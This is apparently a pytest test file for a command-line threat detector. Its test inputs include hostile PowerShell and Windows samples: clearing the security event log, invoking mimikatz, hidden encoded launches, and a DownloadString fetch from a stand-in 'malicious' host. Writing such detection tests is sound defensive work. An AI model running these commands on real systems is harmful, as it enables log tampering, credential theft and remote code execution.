import pytest
from CommandLineAnalysis import (
    is_base64,
    remove_null_bytes,
    decode_base64,
    identify_and_decode_base64,
    reverse_command,
    check_malicious_commands,
    check_reconnaissance_temp,
    check_windows_temp_paths,
    check_suspicious_content,
    check_amsi,
    check_mixed_case_powershell,
    check_powershell_suspicious_patterns,
    check_suspicious_macos_applescript_commands,
    analyze_command_line
)


# Test data
DOUBLE_ENCODED_STRING = "cmVjdXJzaXZlIGRlY29kZSBaR1ZqYjJSbElGWkhhSEJqZVVKd1kzbENhRWxJVW14ak0xRm5Zek5TZVdGWE5XND0="
MALICIOUS_COMMAND_LINE = "wevtutil cl Security RG91YmxlIGVuY29kaW5nIFZHaHBjeUJwY3lCaElHeHBjM1JsYm1WeUtERXhMakV3TVM0eE1qUXVNaklw"
MACOS_COMMAND_LINE = "tell window 1 of application to set visible to false"


@pytest.fixture
def sample_encoded_command() -> str:
    return DOUBLE_ENCODED_STRING


@pytest.fixture
def sample_malicious_command() -> str:
    return MALICIOUS_COMMAND_LINE


# Test is_base64
def test_is_base64():
    valid_base64 = "VGVzdFN0cmluZw=="
    invalid_base64 = "ThisIsNotBase64"

    assert is_base64(valid_base64) is True
    assert is_base64(invalid_base64) is False


# Test remove_null_bytes
def test_remove_null_bytes():
    string_with_nulls = "test\x00string\x00"
    assert remove_null_bytes(string_with_nulls) == "teststring"


# Test decode_base64
def test_decode_base64(sample_encoded_command):
    decoded_str, double_encoded = decode_base64(sample_encoded_command)
    assert "recursive decode" in decoded_str  # Check successful decoding
    assert double_encoded is True  # Verify double encoding is detected


# Test identify_and_decode_base64
def test_identify_and_decode_base64(sample_malicious_command):
    decoded_command, is_double_encoded = identify_and_decode_base64(sample_malicious_command)
    assert "11.101.124.22" in decoded_command
    assert is_double_encoded is True

# Test reverse_command


def test_reverse_command():
    reversed_string = "llehSrewoP"
    result, was_reversed = reverse_command(reversed_string)
    assert result == "PowerShell"
    assert was_reversed is True


# Test check_malicious_commands
def test_check_malicious_commands():
    command = "Invoke-Expression mimikatz"
    matches = check_malicious_commands(command)
    assert "mimikatz" in matches


# Test check_reconnaissance_temp
def test_check_reconnaissance_temp():
    command = "ipconfig /all netstat -ano"
    matches = check_reconnaissance_temp(command)
    assert "ipconfig" in matches
    assert "netstat -ano" in matches


# Test check_windows_temp_paths
def test_check_windows_temp_paths():
    command = "C:\\Temp\\test.txt %TEMP%\\malware.exe"
    matches = check_windows_temp_paths(command)
    assert "C:\\Temp" in matches
    assert "%TEMP%" in matches


# Test check_suspicious_content
def test_check_suspicious_content():
    command = "powershell -enc Y2FsYy5leGU= -WindowStyle Hidden"
    matches = check_suspicious_content(command)
    assert "-enc" in matches
    assert "-WindowStyle Hidden" in matches


# Test check_amsi
def test_check_amsi():
    command = "System.Management.Automation.AmsiUtils"
    matches = check_amsi(command)
    assert "System.Management.Automation.AmsiUtils" in matches


# Test check_mixed_case_powershell
def test_check_mixed_case_powershell():
    command = "PoWeRShElL -NoProfile"
    matches = check_mixed_case_powershell(command)
    assert "PoWeRShElL" in matches


# Test check_powershell_suspicious_patterns
def test_check_powershell_suspicious_patterns():
    command = "powershell -Command (New-Object Net.WebClient).DownloadString('http://malicious')"
    matches = check_powershell_suspicious_patterns(command)
    assert "DownloadString" in matches


# Test check_reconnaissance_temp
def test_check_suspicious_macos_applescript_commands():
    matches = check_suspicious_macos_applescript_commands(MACOS_COMMAND_LINE)
    assert ["to set visible", "false"] in matches["infostealer_characteristics"]

# Test analyze_command_line


def test_analyze_command_line():
    result = analyze_command_line(MALICIOUS_COMMAND_LINE)
    assert result["risk"] == "Medium Risk"
    assert "11.101.124.22" in result["analysis"]["original"]["base64_encoding"]
    assert "11.101.124.22" in result["decoded_command"]
    assert "wevtutil cl Security" in result["original_command"]
